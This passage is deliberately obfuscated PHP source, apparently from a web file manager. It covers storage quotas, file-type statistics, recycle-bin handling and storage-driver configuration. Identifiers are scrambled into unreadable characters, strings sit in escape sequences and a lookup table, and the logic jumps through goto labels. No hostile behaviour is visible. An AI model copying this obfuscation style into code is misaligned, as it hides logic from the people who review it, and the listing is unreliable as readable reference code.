(!$cùÕ³…À°) { return; } if (!in_array($B ’Ÿ«É¢Š, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $bãğƒÒÃí‹ = $this->targetSpaceSize($B ’Ÿ«É¢Š, $cùÕ³…À°); if ($B ’Ÿ«É¢Š == self::TYPE_USER) { Model($DÖé‹ËÂ¾[501])->userEdit($cùÕ³…À°, array($DÖé‹ËÂ¾[1675] => $bãğƒÒÃí‹)); } else { if ($B ’Ÿ«É¢Š == self::TYPE_GROUP) { Model($DÖé‹ËÂ¾[484])->groupEdit($cùÕ³…À°, array($DÖé‹ËÂ¾[1675] => $bãğƒÒÃí‹)); } } } public function targetSpaceSize($e±ƒäñ†ô, $FÅ—Ø“Ñ¬¶) { goto dèòÑµùŠ‘; DÍßõŠó‘‡: $DÃ³¢¸’‚Ø = !$DÃ³¢¸’‚Ø || $DÃ³¢¸’‚Ø <= 0 ? 0 : $DÃ³¢¸’‚Ø; return $DÃ³¢¸’‚Ø; goto C™¿ÏÒÉÍ; FÄ–æËŸÆ: $bï¤’²Ê˜ = array_to_keyvalue($bï¤’²Ê˜, $fÑÀå·ê†é[33], $fÑÀå·ê†é[394]); $bï¤’²Ê˜ = array_unique(array_filter($bï¤’²Ê˜)); if ($bï¤’²Ê˜) { $C‹µ©ó´ÁË = array($fÑÀå·ê†é[408] => array($fÑÀå·ê†é[409], $bï¤’²Ê˜)); $DÃ³¢¸’‚Ø += floatval($this->where($C‹µ©ó´ÁË)->sum($fÑÀå·ê†é[78])); } goto DÍßõŠó‘‡; b®¥‡ŠÉæÉ: $DÃ³¢¸’‚Ø = floatval($a˜°ç¢‡È«[$fÑÀå·ê†é[78]]); $C‹µ©ó´ÁË = array($fÑÀå·ê†é[552] => array($fÑÀå·ê†é[511], $fÑÀå·ê†é[497] . $a˜°ç¢‡È«[$fÑÀå·ê†é[394]] . $fÑÀå·ê†é[512])); $bï¤’²Ê˜ = Model($fÑÀå·ê†é[419])->field($fÑÀå·ê†é[408])->where($C‹µ©ó´ÁË)->select(); goto FÄ–æËŸÆ; dèòÑµùŠ‘: $fÑÀå·ê†é =& $_SERVER[Ç³Íß¦Ó]; $a˜°ç¢‡È« = $this->sourceRoot($e±ƒäñ†ô, $FÅ—Ø“Ñ¬¶, !0); if (!$a˜°ç¢‡È«) { return 0; } goto b®¥‡ŠÉæÉ; C™¿ÏÒÉÍ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($DÇÜ¶”Ş) { return $this->fileTypeProfile($DÇÜ¶”Ş, SourceModel::TYPE_USER); } public function groupFileTypeProfile($e‡øø»Å·Ç) { return $this->fileTypeProfile($e‡øø»Å·Ç, SourceModel::TYPE_GROUP); } private function fileTypeProfile($fğ£‘³Æ‡Œ, $CİáŸÕ¼) { goto Fë¤¹–“àÛ; f¯×îòøêğ: if ($e¥²éš˜“¥) { return $e¥²éš˜“¥; } $D’‰”½Ï¼’ = array($f÷˜‚ƒÆîË[545] => 0); if ($fğ£‘³Æ‡Œ != !1) { $D’‰”½Ï¼’[$f÷˜‚ƒÆîË[482]] = $fğ£‘³Æ‡Œ; $D’‰”½Ï¼’[$f÷˜‚ƒÆîË[402]] = $CİáŸÕ¼; } goto FÖëßàÕ«ë; FÖëßàÕ«ë: $E²ôÍ‚Âš¥ = array(); $E²ôÍ‚Âš¥[$f÷˜‚ƒÆîË[1982]] = array($f÷˜‚ƒÆîË[1983] => LNG($f÷˜‚ƒÆîË[1982]), $f÷˜‚ƒÆîË[1984] => $this->where($D’‰”½Ï¼’)->count(), $f÷˜‚ƒÆîË[547] => $this->where($D’‰”½Ï¼’)->sum($f÷˜‚ƒÆîË[78])); $a‘ò±“Áô = KodIO::fileTypeList(); goto e§–Î‰½‰§; e§–Î‰½‰§: foreach ($a‘ò±“Áô as $B…§Æ¬çˆ => $A¤ä–¬­’÷) { $D’‰”½Ï¼’[$f÷˜‚ƒÆîË[403]] = $this->fileTypeWhere($B…§Æ¬çˆ); $E²ôÍ‚Âš¥[$B…§Æ¬çˆ] = array($f÷˜‚ƒÆîË[1983] => $A¤ä–¬­’÷[$f÷˜‚ƒÆîË[28]], $f÷˜‚ƒÆîË[1984] => $this->where($D’‰”½Ï¼’)->count(), $f÷˜‚ƒÆîË[547] => $this->where($D’‰”½Ï¼’)->sum($f÷˜‚ƒÆîË[78])); } Cache::set($dóÈ¯£¦‰Ó, $E²ôÍ‚Âš¥, 1200); return $E²ôÍ‚Âš¥; goto e¨å–¶Ï©; Fë¤¹–“àÛ: $f÷˜‚ƒÆîË =& $_SERVER[Ç³Íß¦Ó]; $dóÈ¯£¦‰Ó = $f÷˜‚ƒÆîË[1981] . $fğ£‘³Æ‡Œ . $f÷˜‚ƒÆîË[71] . $CİáŸÕ¼; $e¥²éš˜“¥ = Cache::get($dóÈ¯£¦‰Ó); goto f¯×îòøêğ; e¨å–¶Ï©: } public function fileNameExist($EİÜ¯åğ‰ò, $AäçöÊŒ‰) { $a¼Èõ˜ø¬¼ =& $_SERVER[Ç³Íß¦Ó]; $bã‰äÊÊ¡È = $this->where(array($a¼Èõ˜ø¬¼[476] => $EİÜ¯åğ‰ò, $a¼Èõ˜ø¬¼[28] => $AäçöÊŒ‰))->find(); return is_array($bã‰äÊÊ¡È) ? $bã‰äÊÊ¡È[$a¼Èõ˜ø¬¼[394]] : !1; } public function childList($b£åñ¸) { goto e»·–ŒÙíš; DŠ½‡¬¡®Š: $Aªİ„²‰Ú† = array($A±í²ˆùª[476] => intval($b£åñ¸), $A±í²ˆùª[421] => 0); $E¢óÜôèÒ = $this->where($Aªİ„²‰Ú†)->select(); $E¢óÜôèÒ = $E¢óÜôèÒ ? $E¢óÜôèÒ : array(); goto cêŞ±æ˜ó©; cêŞ±æ˜ó©: self::$cacheChildList[$F‚ƒÕÔªóİ] = $E¢óÜôèÒ; foreach ($E¢óÜôèÒ as $DÁº‡„‡È) { $F‚ƒÕÔªóİ = $A±í²ˆùª[436] . $DÁº‡„‡È[$A±í²ˆùª[394]]; self::$cacheSourceInfo[$F‚ƒÕÔªóİ] = $DÁº‡„‡È; } return $E¢óÜôèÒ; goto A»Ò¬©ÜÃ«; e»·–ŒÙíš: $A±í²ˆùª =& $_SERVER[Ç³Íß¦Ó]; $F‚ƒÕÔªóİ = $A±í²ˆùª[1959] . $b£åñ¸; if (isset(self::$cacheChildList[$F‚ƒÕÔªóİ])) { return self::$cacheChildList[$F‚ƒÕÔªóİ]; } goto DŠ½‡¬¡®Š; A»Ò¬©ÜÃ«: } public function fileNameAuto($D™åÒ­Ã¨, $câ…ó»¿‘, $e×ê‚¬½è› = REPEAT_RENAME, $eñ§Ã£“·‚ = false) { $c‰Î¾ÕÏÚ =& $_SERVER[Ç³Íß¦Ó]; $aå¥ø’¹›ó = $this->field($c‰Î¾ÕÏÚ[28])->where(array($c‰Î¾ÕÏÚ[476] => $D™åÒ­Ã¨, $c‰Î¾ÕÏÚ[28] => array($c‰Î¾ÕÏÚ[379], $câ…ó»¿‘ . $c‰Î¾ÕÏÚ[380])))->select(); $CÈö…•Ù¸Ç = array_to_keyvalue($aå¥ø’¹›ó, $c‰Î¾ÕÏÚ[33], $c‰Î¾ÕÏÚ[28]); return $this->fileNameAutoGet($CÈö…•Ù¸Ç, $câ…ó»¿‘, $e×ê‚¬½è›, $eñ§Ã£“·‚); } public function fileNameAutoGet($cƒœÆ°Š«, $cğ„§åÊÎ, $F™È…ËãÓš, $A˜¥ñø¾ø¬) { $eİÛ‚¥İ‰‚ =& $_SERVER[Ç³Íß¦Ó]; if ($F™È…ËãÓš == REPEAT_REPLACE || !$cƒœÆ°Š« || !in_array_not_case($cğ„§åÊÎ, $cƒœÆ°Š«) || $A˜¥ñø¾ø¬ && $F™È…ËãÓš != REPEAT_RENAME_FOLDER) { return $cğ„§åÊÎ; } if ($F™È…ËãÓš == REPEAT_SKIP) { return !1; } $aÜêÂ‡¤”Ê = $eİÛ‚¥İ‰‚[95] . get_path_ext($cğ„§åÊÎ); $aÜêÂ‡¤”Ê = $aÜêÂ‡¤”Ê == $eİÛ‚¥İ‰‚[95] || $A˜¥ñø¾ø¬ ? $eİÛ‚¥İ‰‚[33] : $aÜêÂ‡¤”Ê; for ($dÊ¹ò»Ä‚ = 1; $dÊ¹ò»Ä‚ <= count($cƒœÆ°Š«) + 1; $dÊ¹ò»Ä‚++) { $B…¯ÙîÈŒº = substr($cğ„§åÊÎ, 0, strlen($cğ„§åÊÎ) - strlen($aÜêÂ‡¤”Ê)); $f“İÏ—ğ = $B…¯ÙîÈŒº . "\50{$dÊ¹ò»Ä‚}\51{$aÜêÂ‡¤”Ê}"; if (!in_array_not_case($f“İÏ—ğ, $cƒœÆ°Š«)) { return $f“İÏ—ğ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\x63\x65\x5f\162\x65\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\143\162\145\141\164\145\x54\151\x6d\x65", "\x74\151\155\145", "\x69\156\x73\145\162\x74", "\x66\165\x6e\x63\164\x69\157\156")); public function listData($CˆßŒ‹™÷ = false) { $aÚæøÓÍáŠ =& $_SERVER[Ç³Íß¦Ó]; $CˆßŒ‹™÷ = $CˆßŒ‹™÷ ? $CˆßŒ‹™÷ : USER_ID; $aœ¹—­ª = $this->where(array($aÚæøÓÍáŠ[1518] => $CˆßŒ‹™÷))->select(); return array_to_keyvalue($aœ¹—­ª, $aÚæøÓÍáŠ[33], $aÚæøÓÍáŠ[394]); } public function moveToRecycle($EÛŞˆ‚‚’´) { goto bĞ‰§ ùŞ; b„»‘Öñæ: if (!$Cøø·¦Èñ || $Cøø·¦Èñ[$Dâ°½®•˜ë[421]] == $Dâ°½®•˜ë[87]) { return; } $F´šÜ—’Á = array($Dâ°½®•˜ë[408] => $EÛŞˆ‚‚’´, $Dâ°½®•˜ë[1518] => USER_ID, $Dâ°½®•˜ë[548] => $Cøø·¦Èñ[$Dâ°½®•˜ë[402]], $Dâ°½®•˜ë[549] => $Cøø·¦Èñ[$Dâ°½®•˜ë[482]], $Dâ°½®•˜ë[552] => $Cøø·¦Èñ[$Dâ°½®•˜ë[485]]); $this->add($F´šÜ—’Á); goto a†íŞºÂå‰; a†íŞºÂå‰: $this->recycleMove($EÛŞˆ‚‚’´, 1); if ($Cøø·¦Èñ[$Dâ°½®•˜ë[401]] == $Dâ°½®•˜ë[87]) { $e·˜®ŞÀÓ§ = array($Dâ°½®•˜ë[552] => array($Dâ°½®•˜ë[511], $Cøø·¦Èñ[$Dâ°½®•˜ë[485]] . $EÛŞˆ‚‚’´ . $Dâ°½®•˜ë[512])); $B¡™»š³Ñ->where($e·˜®ŞÀÓ§)->setField($Dâ°½®•˜ë[421], 1); } goto Cì¯„‹ÛÙ•; bĞ‰§ ùŞ: $Dâ°½®•˜ë =& $_SERVER[Ç³Íß¦Ó]; $B¡™»š³Ñ = Model($Dâ°½®•˜ë[1204]); $Cøø·¦Èñ = $B¡™»š³Ñ->sourceInfo($EÛŞˆ‚‚’´); goto b„»‘Öñæ; Cì¯„‹ÛÙ•: } public function clear() { $this->remove(!1); } public function remove($FÒ„•™Ÿ¦© = false, $B…§…Èè´ = false) { goto B˜µ¥×á¥¼; D‡ù”»·íÏ: foreach ($bíí“ç¿ô as $d“–»ÜÇ©²) { if ($FÒ„•™Ÿ¦© != !1 && !in_array($d“–»ÜÇ©², $FÒ„•™Ÿ¦©)) { continue; } $DĞ–¹İÊŠˆ = $Eùô—„§æ†->sourceInfo($d“–»ÜÇ©²); $Eùô—„§æ†->remove($d“–»ÜÇ©², !1); $bÙ¿…¸Ğ…¹ = $DĞ–¹İÊŠˆ[$fİÚù±‰Ñ¿[402]] . $fİÚù±‰Ñ¿[71] . $DĞ–¹İÊŠˆ[$fİÚù±‰Ñ¿[482]]; $d¡ËÃŒÊõ­[$bÙ¿…¸Ğ…¹] = array($fİÚù±‰Ñ¿[548] => $DĞ–¹İÊŠˆ[$fİÚù±‰Ñ¿[402]], $fİÚù±‰Ñ¿[482] => $DĞ–¹İÊŠˆ[$fİÚù±‰Ñ¿[482]]); $this->where(array($fİÚù±‰Ñ¿[394] => $d“–»ÜÇ©²))->delete(); } foreach ($d¡ËÃŒÊõ­ as $B·ÒõÜŞÈ) { $Eùô—„§æ†->targetSpaceUpdate($B·ÒõÜŞÈ[$fİÚù±‰Ñ¿[402]], $B·ÒõÜŞÈ[$fİÚù±‰Ñ¿[482]]); } goto cœ´ëè†Ô; A¸—Ÿ÷«´œ: $bíí“ç¿ô = $this->listData($B…§…Èè´); $FÒ„•™Ÿ¦© = $FÒ„•™Ÿ¦© === !1 ? !1 : $FÒ„•™Ÿ¦©; $d¡ËÃŒÊõ­ = array(); goto D‡ù”»·íÏ; B˜µ¥×á¥¼: $fİÚù±‰Ñ¿ =& $_SERVER[Ç³Íß¦Ó]; $B…§…Èè´ = $B…§…Èè´ ? $B…§…Èè´ : USER_ID; $Eùô—„§æ† = Model($fİÚù±‰Ñ¿[1204]); goto A¸—Ÿ÷«´œ; cœ´ëè†Ô: } public function restore($aº¼ªî½øæ = false) { $C…²à‡Ğ = $this->listData(); $this->_restoreSource($C…²à‡Ğ, $aº¼ªî½øæ); } public function removeUserAll($F‡®ÊµÁ£ñ) { $this->remove(!1, $F‡®ÊµÁ£ñ); } private function _restoreSource($c½™“ ÔÇİ, $AÈáäÍ²Å²) { goto Eøáù°·’‹; dĞ‚ÂÚ¢³¤: $d²Á”œîŠí->updateModifyTime($C¬ª‹ŸÃ÷¯); goto dÊØ´ÛÜ¢…; AÎŒ“øã‚à: if (!$c½™“ ÔÇİ) { return !0; } $C¬ª‹ŸÃ÷¯ = array(); foreach ($c½™“ ÔÇİ as $C‚ãä‘¿‘‚) { goto d‰Ëã½Õóò; F°ßÕ´“¸Ê: if ($E å‚¨ˆ½Ä[$Fù‚†ƒù‚Û[421]] == $Fù‚†ƒù‚Û[87]) { continue; } $d²Á”œîŠí->lockMoveStart($C‚ãä‘¿‘‚); $this->recycleMove($C‚ãä‘¿‘‚, 0); goto aŞ»î£Á°Á; aŞ»î£Á°Á: if ($Cë±í³¦[$Fù‚†ƒù‚Û[401]] == $Fù‚†ƒù‚Û[87]) { $BÃ¯ÕØÏÖ = array($Fù‚†ƒù‚Û[552] => array($Fù‚†ƒù‚Û[511], $Cë±í³¦[$Fù‚†ƒù‚Û[485]] . $C‚ãä‘¿‘‚ . $Fù‚†ƒù‚Û[512])); $d²Á”œîŠí->where($BÃ¯ÕØÏÖ)->setField($Fù‚†ƒù‚Û[421], 0); $this->restoreFolderChildren($C‚ãä‘¿‘‚, $c½™“ ÔÇİ); } $this->where(array($Fù‚†ƒù‚Û[394] => $C‚ãä‘¿‘‚))->delete(); $d²Á”œîŠí->folderSizeReset($Cë±í³¦[$Fù‚†ƒù‚Û[476]]); goto fÒ×Š¥Ã÷Û; fÒ×Š¥Ã÷Û: $C¬ª‹ŸÃ÷¯[] = $Cë±í³¦[$Fù‚†ƒù‚Û[476]]; if ($Cë±í³¦[$Fù‚†ƒù‚Û[401]] == $Fù‚†ƒù‚Û[87]) { $C¬ª‹ŸÃ÷¯[] = $C‚ãä‘¿‘‚; } $d²Á”œîŠí->lockMoveEnd($C‚ãä‘¿‘‚); goto cğâ•Ç§„í; d‰Ëã½Õóò: if ($AÈáäÍ²Å² != !1 && !in_array($C‚ãä‘¿‘‚, $AÈáäÍ²Å²)) { continue; } $Cë±í³¦ = $d²Á”œîŠí->sourceInfo($C‚ãä‘¿‘‚); $E å‚¨ˆ½Ä = $d²Á”œîŠí->sourceInfo($Cë±í³¦[$Fù‚†ƒù‚Û[476]]); goto F°ßÕ´“¸Ê; cğâ•Ç§„í: } goto dĞ‚ÂÚ¢³¤; Eøáù°·’‹: $Fù‚†ƒù‚Û =& $_SERVER[Ç³Íß¦Ó]; $d²Á”œîŠí = Model($Fù‚†ƒù‚Û[1204]); $AÈáäÍ²Å² = $AÈáäÍ²Å² == !1 ? !1 : $AÈáäÍ²Å²; goto AÎŒ“øã‚à; dÊØ´ÛÜ¢…: } private function restoreFolderChildren($E‹øİ‡—Œ», $d‹˜ŸäùË) { goto ağ¤á©éˆ°; ağ¤á©éˆ°: $AÃÄ…¡Şù =& $_SERVER[Ç³Íß¦Ó]; $f‡¾­ïÀœ = Model($AÃÄ…¡Şù[1204]); $c¨Ø­ÙÇ™ˆ = array($AÃÄ…¡Şù[394] => array($AÃÄ…¡Şù[7], array())); goto CÂ•Ëâà•¡; Bò˜¤ÆÆ…: $c¨Ø­ÙÇ™ˆ[$AÃÄ…¡Şù[394]][1] = array_unique($c¨Ø­ÙÇ™ˆ[$AÃÄ…¡Şù[394]][1]); $c¨Ø­ÙÇ™ˆ[$AÃÄ…¡Şù[957]] = $AÃÄ…¡Şù[1776]; $f‡¾­ïÀœ->where($c¨Ø­ÙÇ™ˆ)->setField($AÃÄ…¡Şù[421], 1); goto A±¦˜­óÎ”; CÂ•Ëâà•¡: foreach ($d‹˜ŸäùË as $D—À‰¸©µ) { if ($D—À‰¸©µ == $E‹øİ‡—Œ») { continue; } if (!$f‡¾­ïÀœ->isParentOf($E‹øİ‡—Œ», $D—À‰¸©µ)) { continue; } $F‹öò‚æƒ› = $f‡¾­ïÀœ->sourceInfo($D—À‰¸©µ); if ($F‹öò‚æƒ›[$AÃÄ…¡Şù[401]] == $AÃÄ…¡Şù[87]) { $c¨Ø­ÙÇ™ˆ[] = array($AÃÄ…¡Şù[552] => array($AÃÄ…¡Şù[511], $F‹öò‚æƒ›[$AÃÄ…¡Şù[485]] . $D—À‰¸©µ . $AÃÄ…¡Şù[512])); } else { $c¨Ø­ÙÇ™ˆ[$AÃÄ…¡Şù[394]][1][] = $D—À‰¸©µ; } } if (!$c¨Ø­ÙÇ™ˆ[$AÃÄ…¡Şù[394]][1]) { unset($c¨Ø­ÙÇ™ˆ[$AÃÄ…¡Şù[394]]); } if (!$c¨Ø­ÙÇ™ˆ) { return; } goto Bò˜¤ÆÆ…; A±¦˜­óÎ”: } private function recycleMove($aŠßóØõÁø, $D·ô‡¤ó½‹ = 1) { $AÑ²‰‘ÜÊó =& $_SERVER[Ç³Íß¦Ó]; $EçÛ©Ù¡—Ş = Model($AÑ²‰‘ÜÊó[1204]); $eø¡²²‚õ = Model($AÑ²‰‘ÜÊó[1985]); $C§»†Öˆ‡— = array($AÑ²‰‘ÜÊó[394] => $aŠßóØõÁø); if ($D·ô‡¤ó½‹) { $EçÛ©Ù¡—Ş->where($C§»†Öˆ‡—)->setField($AÑ²‰‘ÜÊó[421], 1); $eø¡²²‚õ->eventRecycle($aŠßóØõÁø, $AÑ²‰‘ÜÊó[1986]); } else { $e‚ˆ“­™Àø = $EçÛ©Ù¡—Ş->where($C§»†Öˆ‡—)->find(); $d¤îĞÙø²œ = $e‚ˆ“­™Àø[$AÑ²‰‘ÜÊó[401]] == $AÑ²‰‘ÜÊó[87]; $e®†ÆÜ ìè = $EçÛ©Ù¡—Ş->fileNameAuto($e‚ˆ“­™Àø[$AÑ²‰‘ÜÊó[476]], $e‚ˆ“­™Àø[$AÑ²‰‘ÜÊó[28]], REPEAT_RENAME_FOLDER, $d¤îĞÙø²œ); if ($e®†ÆÜ ìè != $e‚ˆ“­™Àø[$AÑ²‰‘ÜÊó[28]]) { $EçÛ©Ù¡—Ş->rename($aŠßóØõÁø, $e®†ÆÜ ìè); } $EçÛ©Ù¡—Ş->where($C§»†Öˆ‡—)->setField($AÑ²‰‘ÜÊó[421], 0); $eø¡²²‚õ->eventRecycle($aŠßóØõÁø, $AÑ²‰‘ÜÊó[1987]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\163\164\157\162\141\x67\145\114\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\163\x69\x7a\x65\x4d\x61\x78", "\x73\171\163\x74\145\x6d", "\144\x65\146\141\x75\x6c\x74", "\144\x72\x69\x76\x65\162", "\x63\x6f\x6e\146\151\147"); public function listData($e¼Å¼„òôÉ = false, $d®Œ‰Æ†Â = "\155\x6f\144\151\146\171\124\151\155\145", $F¿«Àí˜îÓ = false) { $C³„Ó„Í´Õ =& $_SERVER[Ç³Íß¦Ó]; $a¸‹é“˜ß§ = parent::listData($e¼Å¼„òôÉ, $d®Œ‰Æ†Â, $F¿«Àí˜îÓ); if ($e¼Å¼„òôÉ) { return $a¸‹é“˜ß§; } $e–¤¦”éå” = $this->ioSizeUseGet(array_to_keyvalue($a¸‹é“˜ß§, $C³„Ó„Í´Õ[33], $C³„Ó„Í´Õ[392])); foreach ($a¸‹é“˜ß§ as $C¾§Èğ›«ã => $D¹­¼ÚÇß) { unset($a¸‹é“˜ß§[$C¾§Èğ›«ã][$C³„Ó„Í´Õ[6]]); $a¸‹é“˜ß§[$C¾§Èğ›«ã][$C³„Ó„Í´Õ[1675]] = isset($e–¤¦”éå”[$D¹­¼ÚÇß[$C³„Ó„Í´Õ[392]]]) ? $e–¤¦”éå”[$D¹­¼ÚÇß[$C³„Ó„Í´Õ[392]]] : 0; } return $a¸‹é“˜ß§; } public function ioSizeUseGet($AÑÜâ‹Œâ¾) { goto Bãï§»„è; f…â¨½ •­: $EËç¦´‘ = array($a¡Ø“¹¤‹í[783] => array($a¡Ø“¹¤‹í[7], $AÑÜâ‹Œâ¾)); $EÅ´º¡¾‘ = Model($a¡Ø“¹¤‹í[748])->field($F¬Òƒ‚ÃäŠ)->where($EËç¦´‘)->group($a¡Ø“¹¤‹í[783])->select(); $EÅ´º¡¾‘ = array_to_keyvalue($EÅ´º¡¾‘, $a¡Ø“¹¤‹í[392], $a¡Ø“¹¤‹í[78]); goto c›„õÜ›è¿; c›„õÜ›è¿: Cache::set($cê÷é·Ë½õ, $EÅ´º¡¾‘, 600); return $EÅ´º¡¾‘; goto d†íŒ½µ; dì—äîŸÊ‚: $EÅ´º¡¾‘ = Cache::get($cê÷é·Ë½õ); if ($EÅ´º¡¾‘) { return $EÅ´º¡¾‘; } $F¬Òƒ‚ÃäŠ = array($a¡Ø“¹¤‹í[783] => $a¡Ø“¹¤‹í[392], $a¡Ø“¹¤‹í[1989] => $a¡Ø“¹¤‹í[78]); goto f…â¨½ •­; Bãï§»„è: $a¡Ø“¹¤‹í =& $_SERVER[Ç³Íß¦Ó]; if (!$AÑÜâ‹Œâ¾) { return array(); } $cê÷é·Ë½õ = $a¡Ø“¹¤‹í[1988] . implode($a¡Ø“¹¤‹í[47], $AÑÜâ‹Œâ¾); goto dì—äîŸÊ‚; d†íŒ½µ: } public function getConfig($D†êàÏŠË›) { $d¹«ˆ‰ŒÎÅ = parent::listData($D†êàÏŠË›); return json_decode($d¹«ˆ‰ŒÎÅ[$_SERVER[Ç³Íß¦Ó][6]], !0); } public function update($c¹Ê¡¯…ƒ, $aÑ¹õË³÷“) { goto fŠ‚‘ëªÖ‹; fŠ‚‘ëªÖ‹: $eÚ¿ĞôŠ°¼ =& $_SERVER[Ç³Íß¦Ó]; $bñàòÏã˜ = $aÑ¹õË³÷“[$eÚ¿ĞôŠ°¼[28]]; $E÷Ìàß‘îØ = array_to_keyvalue(parent::listData(), $eÚ¿ĞôŠ°¼[28]); goto eğÓÕÇ‰Œ™; E³×ï×„¬ù: $eÑ¡¹çöŠ = parent::update($c¹Ê¡¯…ƒ, $aÑ¹õË³÷“); if ($eÑ¡¹çöŠ && $aÑ¹õË³÷“[$eÚ¿ĞôŠ°¼[34]]) { foreach ($E÷Ìàß‘îØ as $dŞèš‡¤¸¦) { if ($dŞèš‡¤¸¦[$eÚ¿ĞôŠ°¼[34]] && $dŞèš‡¤¸¦[$eÚ¿ĞôŠ°¼[392]] != $c¹Ê¡¯…ƒ) { parent::update($dŞèš‡¤¸¦[$eÚ¿ĞôŠ°¼[392]], array($eÚ¿ĞôŠ°¼[34] => 0)); } } } return $eÑ¡¹çöŠ; goto E®¿ŸªÛ²; eğÓÕÇ‰Œ™: if (isset($E÷Ìàß‘îØ[$bñàòÏã˜]) && $E÷Ìàß‘îØ[$bñàòÏã˜][$eÚ¿ĞôŠ°¼[392]] != $c¹Ê¡¯…ƒ) { return !1; } if (isset($aÑ¹õË³÷“[$eÚ¿ĞôŠ°¼[1990]]) && $aÑ¹õË³÷“[$eÚ¿ĞôŠ°¼[1990]] == $eÚ¿ĞôŠ°¼[87]) { $this->checkConfig($aÑ¹õË³÷“); } unset($aÑ¹õË³÷“[$eÚ¿ĞôŠ°¼[1990]]); goto E³×ï×„¬ù; E®¿ŸªÛ²: } public function add($Dë‡ìùÂÃÑ) { goto bá©Âßôà×; bá©Âßôà×: $F—¡ç·ÎÚ² =& $_SERVER[Ç³Íß¦Ó]; $aùÔö¿Û¯î = array_to_keyvalue(parent::listData(), $F—¡ç·ÎÚ²[28]); if (isset($aùÔö¿Û¯î[$Dë‡ìùÂÃÑ[$F—¡ç·ÎÚ²[28]]])) { return !1; } goto fÈæŞ½šÛ…; fÈæŞ½šÛ…: $this->checkConfig($Dë‡ìùÂÃÑ); $E˜ÂâÏ‘ = parent::insert($Dë‡ìùÂÃÑ); if ($E˜ÂâÏ‘ && $Dë‡ìùÂÃÑ[$F—¡ç·ÎÚ²[34]]) { foreach ($aùÔö¿Û¯î as $f£‡ìóæÆ¹) { if ($f£‡ìóæÆ¹[$F—¡ç·ÎÚ²[34]]) { parent::update($f£‡ìóæÆ¹[$F—¡ç·ÎÚ²[392]], array($F—¡ç·ÎÚ²[34] => 0)); } } } goto A…½»ˆº¤; A…½»ˆº¤: return $E˜ÂâÏ‘; goto dÏÙƒŒ‘ß¨; dÏÙƒŒ‘ß¨: } public function checkConfig(&$CğË„ÇÚİ·) { goto a·½ˆ¡¹˜—; EàÃİšÈÔ”: $eÄµŒ²Ç = $BÆÌË†ºÉ->getPath($dÈĞÂŒÊ® . $f–³Òùéæ¹[1137]); if (!$BÆÌË†ºÉ->mkfile($eÄµŒ²Ç)) { show_json(LNG($f–³Òùéæ¹[1995]), !1); } $CÌš¡©÷–Í[$f–³Òùéæ¹[1076]] = $dÈĞÂŒÊ®; goto d¦¶—Í‹Ï©; b¬‡²ÃÂÇ: foreach ($CÌš¡©÷–Í as $D»‹¤›¯ŸĞ => $cŸŠ´«½†) { $CÌš¡©÷–Í[$D»‹¤›¯ŸĞ] = trim($cŸŠ´«½†); } $CÌš¡©÷–Í[$f–³Òùéæ¹[1991]] = rand_string(6); $eØ¥•ÏÚĞ½ = $GLOBALS[$f–³Òùéæ¹[6]][$f–³Òùéæ¹[88]][$f–³Òùéæ¹[792]]; goto aÖ £ò‹ÜÁ; d¦¶—Í‹Ï©: $CğË„ÇÚİ·[$f–³Òùéæ¹[6]] = json_encode($CÌš¡©÷–Í); $CğË„ÇÚİ·[$f–³Òùéæ¹[94]] = $Bèá¾¸»®£; return !0; goto b›ê…ÄåÎ¥; a·½ˆ¡¹˜—: $f–³Òùéæ¹ =& $_SERVER[Ç³Íß¦Ó]; $Féò¸Ñ¦»¹ = strtolower($CğË„ÇÚİ·[$f–³Òùéæ¹[94]]); $CÌš¡©÷–Í = json_decode($CğË„ÇÚİ·[$f–³Òùéæ¹[6]], !0); goto b¬‡²ÃÂÇ; E²‰…’èù: $BÆÌË†ºÉ = new $CšâÍÌôº($CÌš¡©÷–Í); if (in_array($Féò¸Ñ¦»¹, $BÆÌË†ºÉ->objectDriver)) { if (!$BÆÌË†ºÉ->isBucketCors() && !$BÆÌË†ºÉ->setBucketCors()) { $AÒĞáåÆ‹ = LNG($f–³Òùéæ¹[1995]); $AÒĞáåÆ‹ .= $f–³Òùéæ¹[1996] . LNG($f–³Òùéæ¹[1997]); show_json($AÒĞáåÆ‹, !1); } } $dÈĞÂŒÊ® = rtrim($CÌš¡©÷–Í[$f–³Òùéæ¹[1076]], $f–³Òùéæ¹[8]) . $f–³Òùéæ¹[8]; goto EàÃİšÈÔ”; aÖ £ò‹ÜÁ: $Bèá¾¸»®£ = isset($eØ¥•ÏÚĞ½[$Féò¸Ñ¦»¹]) ? $eØ¥•ÏÚĞ½[$Féò¸Ñ¦»¹] : ucfirst($Féò¸Ñ¦»¹); $CšâÍÌôº = $f–³Òùéæ¹[72] . $Bèá¾¸»®£; if (!$Bèá¾¸»®£ || !class_exists($CšâÍÌôº)) { write_log(array($f–³Òùéæ¹[1992], $CğË„ÇÚİ·, get_caller_info()), $f–³Òùéæ¹[1993]); show_json(LNG($f–³Òùéæ¹[1994]), !1, $CğË„ÇÚİ·); } goto E²‰…’èù; b›ê…ÄåÎ¥: } public function driverListSystem() { $b‹—¶¦â¨¨ =& $_SERVER[Ç³Íß¦Ó]; $dæ¸Å³Šøµ = parent::listData(); $dŞ†ŠÓ‰ë° = array(); foreach ($dæ¸Å³Šøµ as $A¢˜®Ë‹÷) { unset($A¢˜®Ë‹÷[$b‹—¶¦â¨¨[193]], $A¢˜®Ë‹÷[$b‹—¶¦â¨¨[84]]); $A¢˜®Ë‹÷[$b‹—¶¦â¨¨[6]] = json_decode($A¢˜®Ë‹÷[$b‹—¶¦â¨¨[6]], !0); $dŞ†ŠÓ‰ë°[] = $A¢˜®Ë‹÷; } return $dŞ†ŠÓ‰ë°; } public function defaultDriver() { $a†èçà§· =& $_SERVER[Ç³Íß¦Ó]; $fÖ´ç¸î–® = parent::listData(); $A¦ˆñè² ç = array_filter_by_field($fÖ´ç¸î–®, $a†èçà§·[34], 1); $A¦ˆñè² ç = $A¦ˆñè² ç[0]; if ($A¦ˆñè² ç) { $A¦ˆñè² ç[$a†èçà§·[6]] = json_decode($A¦ˆñè² ç[$a†èçà§·[6]], !0); } return $A¦ˆñè² ç; } public function driverInfo($EïƒÒˆïáÇ) { $B°É¬ŸêÂ =& 